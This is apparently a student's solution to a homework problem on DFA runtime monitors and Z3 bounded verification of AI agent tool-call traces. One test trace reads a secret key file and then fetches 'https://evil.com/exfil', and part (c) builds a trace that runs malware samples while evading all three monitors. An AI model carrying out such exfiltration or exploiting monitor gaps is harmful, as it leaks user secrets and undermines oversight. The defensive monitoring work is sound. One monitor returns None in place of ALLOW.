"""
CS292C Homework 2 — Problem 4: DFA Monitors + Bounded Trace Verification (20 pts)
===================================================================================
Part (a): Implement three stateful runtime monitors as DFAs.
Part (b): Verify the same properties using Z3 bounded model checking.
Part (c): Find a trace that passes all monitors but is still dangerous.
"""

from z3 import *
from dataclasses import dataclass

# ============================================================================
# Event Model
# ============================================================================

@dataclass
class ToolEvent:
    """A single tool-call event in an agent trace."""
    tool: str          # "file_read", "file_write", "shell_exec", "network_fetch"
    path: str          # target file/resource path
    is_sensitive: bool  # whether the target is sensitive

ALLOW = "ALLOW"
DENY = "DENY"


# ============================================================================
# Part (a): DFA Monitors — 8 pts
#
# Each monitor is a stateful object. Call monitor.step(event) for each
# event in order. It returns ALLOW or DENY.
#
# Implement the three monitors below.
# ============================================================================

SANDBOX_DIR = "/project/"  # paths starting with this are "in sandbox"

class SandboxMonitor:
    """
    Policy: Deny any file_write where path does not start with SANDBOX_DIR.
    All other tool calls are allowed.

    This is a 2-state DFA:
      - State OK (accepting): no violations yet.
      - State VIOLATION (rejecting): a write outside sandbox was attempted.
    Once in VIOLATION, all subsequent calls are denied.
    """

    def __init__(self):
        self.okay = True

    def step(self, event: ToolEvent) -> str:
        if (event.tool == "file_write") and \
            event.path.find(SANDBOX_DIR) != 0:
            self.okay = False
        
        if self.okay:
            return ALLOW
        else:
            return DENY

class ReadBeforeWriteMonitor:
    """
    Policy: Deny any file_write to a path that has not been file_read first.

    This monitor tracks a set of "read paths". When a file_read occurs,
    the path is added to the set. When a file_write occurs, the path
    must already be in the set, or the monitor denies it.

    Unlike SandboxMonitor, this monitor does NOT enter an absorbing violation
    state — it only denies the specific file_write that has no prior read.
    Subsequent operations are evaluated independently.
    """

    def __init__(self):
        self.pathsRead = []

    def step(self, event: ToolEvent) -> str:
        if (event.tool == "file_write") and not (event.path in self.pathsRead):
            return DENY
        elif (event.tool == "file_read"):
            self.pathsRead.append(event.path)


class NoExfilMonitor:
    """
    Policy: After any file_read of a sensitive resource, deny ALL subsequent
    network_fetch calls (regardless of target).

    2-state DFA:
      - State CLEAN: no sensitive data has been read yet.
      - State TAINTED: a sensitive file_read has occurred.
    In TAINTED state, network_fetch is denied.
    """

    def __init__(self):
        self.tainted = False

    def step(self, event: ToolEvent) -> str:
        if event.is_sensitive and event.tool == "file_read":
            self.tainted = True

        if self.tainted and event.tool == "network_fetch":
            return DENY
        
        return ALLOW


class ComposedMonitor:
    """Runs all three monitors in parallel. Denies if ANY monitor denies."""

    def __init__(self):
        self.monitors = [SandboxMonitor(), ReadBeforeWriteMonitor(), NoExfilMonitor()]

    def step(self, event: ToolEvent) -> str:
        results = [m.step(event) for m in self.monitors]
        return DENY if DENY in results else ALLOW


# ============================================================================
# Part (a) continued: Test traces
# ============================================================================

def test_monitors():
    """Test the monitors on example traces."""

    print("=== Part (a): DFA Monitor Tests ===\n")

    # Trace 1: Should be fully allowed
    trace1 = [
        ToolEvent("file_read",  "/project/src/main.py", False),
        ToolEvent("file_write", "/project/src/main.py", False),
        ToolEvent("shell_exec", "/project/run_tests.sh", False),
    ]

    # Trace 2: Should be denied by SandboxMonitor (write outside sandbox)
    trace2 = [
        ToolEvent("file_read",  "/project/src/main.py", False),
        ToolEvent("file_write", "/etc/passwd", False),  # ← violation
    ]

    # Trace 3: Should be denied by ReadBeforeWriteMonitor (write without read)
    trace3 = [
        ToolEvent("file_write", "/project/src/new_file.py", False),  # ← no prior read
    ]

    # Trace 4: Should be denied by NoExfilMonitor (network after sensitive read)
    trace4 = [
        ToolEvent("file_read",     "/project/secrets/api_key.txt", True),  # sensitive!
        ToolEvent("network_fetch", "https://evil.com/exfil", False),       # ← denied
    ]

    for i, (trace, name) in enumerate([(trace1, "clean"), (trace2, "sandbox violation"),
                                        (trace3, "write-before-read"), (trace4, "exfiltration")], 1):
        cm = ComposedMonitor()
        results = []
        for event in trace:
            r = cm.step(event)
            results.append(r)

        print(f"  Trace {i} ({name}):")
        for event, r in zip(trace, results):
            print(f"    {event.tool:16s} {event.path:40s} → {r}")
        denied = any(r == DENY for r in results)
        print(f"    {'BLOCKED' if denied else 'ALLOWED'}\n")


# ============================================================================
# Part (b): Bounded Trace Verification with Z3 — 8 pts
#
# Verify the same three properties using Z3 bounded model checking.
# For each property, encode a symbolic trace of length K and check whether
# a violation is possible.
# ============================================================================

# Tool encoding for Z3
# These integer constants correspond to the string tool names in ToolEvent:
# FILE_READ=0 ↔ "file_read", FILE_WRITE=1 ↔ "file_write",
# SHELL_EXEC=2 ↔ "shell_exec", NETWORK_FETCH=3 ↔ "network_fetch"
FILE_READ = 0
FILE_WRITE = 1
SHELL_EXEC = 2
NETWORK_FETCH = 3

def make_symbolic_trace(K):
    """Create symbolic trace variables for K steps."""
    tool = [Int(f"tool_{i}") for i in range(K)]
    # path_in_sandbox[i] = True iff the target at step i is in the sandbox
    in_sandbox = [Bool(f"in_sandbox_{i}") for i in range(K)]
    # is_sensitive[i] = True iff the target at step i is sensitive
    is_sensitive = [Bool(f"is_sensitive_{i}") for i in range(K)]
    # path_id[i] = integer ID representing the file path
    path_id = [Int(f"path_{i}") for i in range(K)]

    # Well-formedness
    wf = []
    for i in range(K):
        wf.append(And(tool[i] >= 0, tool[i] <= 3))
        wf.append(And(path_id[i] >= 0, path_id[i] <= 9))

    return {'tool': tool, 'in_sandbox': in_sandbox,
            'is_sensitive': is_sensitive, 'path_id': path_id, 'K': K}, wf


def verify_property_bounded(name, K, prop_negation_fn):
    """
    Check if a property can be violated in any trace of length K.
    prop_negation_fn(trace) should return constraints asserting a violation exists.
    """
    trace, wf = make_symbolic_trace(K)
    s = Solver()
    s.add(wf)
    s.add(prop_negation_fn(trace))

    result = s.check()
    print(f"  {name} (K={K}): ", end="")
    if result == sat:
        m = s.model()
        print("VIOLATION FOUND:")
        for i in range(K):
            t = m.eval(trace['tool'][i]).as_long()
            names = {0: "file_read", 1: "file_write", 2: "shell_exec", 3: "net_fetch"}
            p = m.eval(trace['path_id'][i])
            sb = m.eval(trace['in_sandbox'][i], model_completion=True)
            se = m.eval(trace['is_sensitive'][i], model_completion=True)
            print(f"    step {i}: {names.get(t, '?'):12s} path={p} sandbox={sb} sensitive={se}")
    else:
        print("NO VIOLATION POSSIBLE (property holds for all traces)")
    print()


def part_b():
    """
    For each of the three properties, encode the NEGATION and use Z3 to
    find a violating trace (or prove none exists).
    """
    K = 8
    print(f"=== Part (b): Bounded Trace Verification (K={K}) ===\n")

    # Property 1: Sandbox — every file_write must have in_sandbox = True
    def negate_sandbox(trace):
        tool = trace['tool']
        in_sb = trace['in_sandbox']
        K = trace['K']

        bad = []

        for j in range(K):
            bad.append(
                And(
                    tool[j] == FILE_WRITE,
                    Not(in_sb[j])
                )
            )

        return [Or(bad) if bad else BoolVal(False)]

    # Property 2: Read-before-write — every file_write at step j to path p
    # must have a file_read at some step i < j to the same path p.
    def negate_read_before_write(trace):
        tool = trace['tool']
        in_sb = trace['in_sandbox']
        K = trace['K']
        path = trace['path_id']

        bad = []

        for j in range(K):
            noRead = []

            for i in range(j):
                noRead.append(
                    And(
                        tool[i] == FILE_READ,
                        path[i] == path[j]
                    )
                )

            bad.append(
                And(
                    tool[j] == FILE_WRITE,
                    Not(Or(noRead)) if len(noRead) > 0 else True
                )
            )


        return [Or(bad) if bad else BoolVal(False)]

    # Property 3: No exfiltration — if file_read at step i is sensitive,
    # then no network_fetch at any step j > i.
    def negate_no_exfil(trace):
        tool = trace['tool']
        sensitive = trace['is_sensitive']
        K = trace['K']

        bad = []

        for i in range(K):
            for j in range(i+1, K):
                bad.append(
                    And(
                        tool[i] == FILE_READ,
                        sensitive[i],
                        tool[j] == NETWORK_FETCH
                    )
                )

        return [Or(bad) if bad else False]
    
    verify_property_bounded("Sandbox", K, negate_sandbox)
    verify_property_bounded("Read-before-write", K, negate_read_before_write)
    verify_property_bounded("No-exfiltration", K, negate_no_exfil)

    # [EXPLAIN] in a comment:
    # In the DFA monitor approach, we define the policies and then can apply
    # them to a specific trace. This allows us to detect violations in traces at runtime.
    # In the Z3 bounded approach, instead of looking at specific traces,
    # we can detect whether or not individual policies are breakable by any trace with a certain length.
    # The DFA monitor approach could be applied at runtime, but will miss general patterns if there
    # is a possibility to break a policy.
    # The Z3 bounded approach will show us possible counterexamples but is less useful for individual
    # verification of real traces. It also requires a length bound, so if the properties were guaranteed
    # for some given length, there's no guarantee longer tool chains wouldn't break the policies.


# ============================================================================
# Part (c): Monitor Completeness — 4 pts
#
# Find a trace of length 6 that is ACCEPTED by all three monitors but
# still violates a safety property not covered by the monitors.
#
# [EXPLAIN] in a comment in part_c():
# 1. What property does your trace violate?
# 2. Why don't the three monitors catch it?
# 3. What additional monitor would you add to catch it?
# ============================================================================

def part_c():
    print("=== Part (c): Monitor Completeness ===\n")

    trace = [
        ToolEvent("file_read",  "/researchSamples/maliciousPrograms/awfulVirus", True),
        ToolEvent("file_read",  "/researchSamples/maliciousPrograms/awfulVirus", True),
        ToolEvent("file_read",  "/researchSamples/maliciousPrograms/awfulVirus", True),
        ToolEvent("shell_exec", "/researchSamples/maliciousPrograms/awfulVirus", True),
        ToolEvent("shell_exec", "/researchSamples/maliciousPrograms/awfulVirus", True),
        ToolEvent("shell_exec", "/researchSamples/maliciousPrograms/awfulVirus", True),
    ]

    cm = ComposedMonitor()
    print("  Trace:")
    all_allowed = True
    for event in trace:
        r = cm.step(event)
        print(f"    {event.tool:16s} {event.path:40s} sens={event.is_sensitive} → {r}")
        if r == DENY:
            all_allowed = False

    print(f"\n  All allowed: {all_allowed}")
    # [EXPLAIN] in a comment: what property does this trace violate and why?
    # This trace runs shell_exec on sensitive resources. This is not covered by any of the security policies.
    # For example, we may be using coding agents to analyze research samples of malicious programs
    # gathered online. None of the security policies restrict shell_exec on sensitive files.

    # We could fix this vulnerability by adding a fourth monitor that has two states: OKAY and DANGEROUS.
    # When shell_exec is called on a dangerous resource it would switch to DANGEROUS.
    # Then it would deny all tool calls.
    print()


# ============================================================================
if __name__ == "__main__":
    test_monitors()
    part_b()
    part_c()
